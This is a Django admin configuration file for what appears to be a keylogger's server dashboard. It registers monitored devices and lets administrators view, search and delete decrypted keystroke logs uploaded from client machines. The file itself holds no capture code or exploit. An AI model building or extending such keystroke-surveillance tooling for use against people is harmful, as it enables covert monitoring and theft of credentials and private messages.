# dashboard/admin.py
from django.contrib import admin
from .models import MonitoredDevice, KeystrokeLog
from django.conf import settings
from cryptography.fernet import Fernet, InvalidToken
from django.utils.html import format_html

# --- Inline for KeystrokeLog within MonitoredDevice view ---
class KeystrokeLogInline(admin.TabularInline): # Or admin.StackedInline
    model = KeystrokeLog
    extra = 0 # Don't show extra empty forms for adding new ones here
    fields = ('server_timestamp', 'display_decrypted_content_safe',)
    readonly_fields = ('server_timestamp', 'display_decrypted_content_safe',)
    can_delete = True # Allow deleting individual logs from the device view
    show_change_link = False # Logs are simple, no need for a separate change page link from here
    ordering = ['-server_timestamp']

    def display_decrypted_content_safe(self, obj):
        # For safety, especially if content could be misinterpreted as HTML
        return format_html("<pre style='white-space: pre-wrap; word-break: break-all;'>{}</pre>", obj.decrypted_content)
    display_decrypted_content_safe.short_description = "Decrypted Log Content"

    def has_add_permission(self, request, obj=None):
        return False # Logs should only come from clients, not added via admin inline

    def has_change_permission(self, request, obj=None):
        return False # Logs are immutable through admin here, only view/delete


# --- Admin configuration for MonitoredDevice ---
@admin.register(MonitoredDevice)
class MonitoredDeviceAdmin(admin.ModelAdmin):
    list_display = ('get_effective_display_name', 'hostname', 'last_seen', 'first_seen', 'is_active')
    search_fields = ('hostname', 'display_name')
    list_filter = ('is_active', 'last_seen', 'first_seen')
    
    # Fields to display in the form view (add/change)
    # Making hostname readonly after creation
    fields = ('hostname', 'display_name', 'is_active', 'device_uuid', 'first_seen', 'last_seen')
    
    # Inlines allow viewing/managing related KeystrokeLogs directly on the MonitoredDevice page
    inlines = [KeystrokeLogInline]

    def get_readonly_fields(self, request, obj=None):
        if obj: # When editing an existing object
            return ('hostname', 'device_uuid', 'first_seen', 'last_seen')
        return ('device_uuid', 'first_seen', 'last_seen') # When adding a new one (hostname can be set)

    def get_effective_display_name(self, obj):
        return obj.get_effective_display_name()
    get_effective_display_name.short_description = 'Device Name'
    get_effective_display_name.admin_order_field = 'display_name' # Allows sorting

    # Action to quickly toggle 'is_active' status
    def activate_devices(self, request, queryset):
        queryset.update(is_active=True)
    activate_devices.short_description = "Activate selected devices"

    def deactivate_devices(self, request, queryset):
        queryset.update(is_active=False)
    deactivate_devices.short_description = "Deactivate selected devices"

    actions = [activate_devices, deactivate_devices]


# --- Admin configuration for KeystrokeLog ---
@admin.register(KeystrokeLog)
class KeystrokeLogAdmin(admin.ModelAdmin):
    list_display = ('device_info', 'server_timestamp', 'preview_decrypted_content')
    list_filter = ('device__hostname', 'device__display_name', 'server_timestamp')
    search_fields = ('device__hostname', 'device__display_name', 'decrypted_content')
    
    # Make all fields read-only as logs should be immutable from client data
    readonly_fields = ('device', 'server_timestamp', 'decrypted_content_display_safe')
    fields = ('device', 'server_timestamp', 'decrypted_content_display_safe') # For the detail view

    def device_info(self, obj):
        return obj.device.get_effective_display_name()
    device_info.short_description = 'Device'
    device_info.admin_order_field = 'device__display_name' # Allows sorting by device name

    def preview_decrypted_content(self, obj):
        return (obj.decrypted_content[:75] + '...') if len(obj.decrypted_content) > 75 else obj.decrypted_content
    preview_decrypted_content.short_description = "Log Preview"

    def decrypted_content_display_safe(self, obj):
        # Using format_html and <pre> for safe display of potentially multi-line or special char content
        return format_html("<pre style='white-space: pre-wrap; word-break: break-all;'>{}</pre>", obj.decrypted_content)
    decrypted_content_display_safe.short_description = "Full Decrypted Log Content"

    def has_add_permission(self, request):
        return False # Logs should only come from clients

    def has_change_permission(self, request, obj=None):
        return False # Logs are immutable